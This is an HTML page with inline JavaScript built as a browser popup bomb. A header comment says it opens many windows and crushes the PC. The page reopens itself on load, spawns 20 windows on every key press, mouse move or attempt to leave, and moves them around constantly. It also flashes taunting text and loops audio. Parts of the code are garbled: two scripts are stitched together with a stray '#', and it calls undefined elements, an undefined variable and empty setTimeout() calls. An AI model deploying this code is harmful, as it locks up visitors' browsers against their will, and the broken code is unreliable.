<!-- Source: http://jsenabled.blogspot.com/2011/09/9-funniest-javascript-effects.html -->
<!-- Opens lots of windows in the browser and crushes the PC. -->

<html>
<head>
    <title>HaAHHAHAHAHAHAHHAHAHAHAHAHAHAHAHAHHAHAHHAAHHAHAAHHAHAHAHAHAH</title>
    <script>
        activ = window.setInterval("Farbe()", 100);
        farbe=1;
        
        function Farbe() {
            if(farbe==1) {
                document.bgColor="000000";
                farbe=2;
            }else {
                document.bgColor="FF0000";
                farbe=1;
            }
            
        }

        function erneut(){
            window.open(self.location,'');
        }
        
        window.onload = erneut;
    </script>#  <script>
        const title = document.getElementById('title')
        const body = document.getElementById('bodyEl')

        const music = new Audio('music.mp3')

        let nextAn = 1
        let indexN = 0
        let wordlist = ['HA', 'YOU', 'ARE', 'STUPID']
        let popups = [window]

        function getRandomCordinats(){
            return [Math.floor(Math.random() * (screen.width-100 - 0) + 0), Math.floor(Math.random() * (screen.height-100 - 0) + 0)]
        }

        setInterval(()=>{
            if (popups.length!=0){
                for (let i = 0; i < popups.length;i++){
                    let xy = getRandomCordinats()
                    popups[i].moveTo(xy[0], xy[1])
                    popups[i].focus()
                }
            }
        }, 50)/*make this lower later*/

        setInterval(()=>{
            title.textContent = wordlist[indexN]
            if(nextAn==1){
                title.style.color = 'black'
                body.style.backgroundColor = 'white'
                nextAn = 2
            }else{
                title.style.color = 'white'
                body.style.backgroundColor = 'black'
                nextAn = 1
            }
            if (indexN == 3) {
                indexN = 0
            }else{
                indexN++
            }
        }, 400)

        function createNewPopUp(){
            let newWindow = window.open('index.html','', 'width=500px height=350px')
            popups.push(newWindow)
	    setTimeout()
        }

        window.addEventListener('beforeunload', (e)=>{
            for (let i = 0; i<20; i++){
                createNewPopUp()
		setTimeout()
            }

            e.preventDefault()
            e.returnValue = ''
        })
        
        window.addEventListener('load', ()=>{
            let h = window.innerHeight
            title.style.marginTop = (h/2 - 120).toString() + "px"
        })

        window.addEventListener('resize', ()=>{
            let h = window.innerHeight
            title.style.marginTop = (h/2 - 120).toString() + "px"
        })

        document.addEventListener('click', ()=>{
            music.play()
        })

        document.addEventListener('mouseenter', ()=>{
            music.play()
        })

        document.addEventListener('keydown', (e)=>{
            music.play()
            for (let i = 0; i<20; i++){
                createNewPopUp()
		setTimeout()
            }
            e.preventDefault()
        })

	document.addEventListener('keydown', (e)=>{
            if (keyPressed === 'p') {
        	throw new Error("Virus has stopped executing: force closed button detected!")
	}
        })

	 document.addEventListener('mousemove', (e)=>{
            music.play()
            for (let i = 0; i<20; i++){
                createNewPopUp()
		setTimeout()
            }
            e.preventDefault()
        })

        music.addEventListener('ended', ()=>{
            music.play()
        })

        
    </script>
</head>
<body>
    <h1>IMAGINE</h1>
</body>
</html>
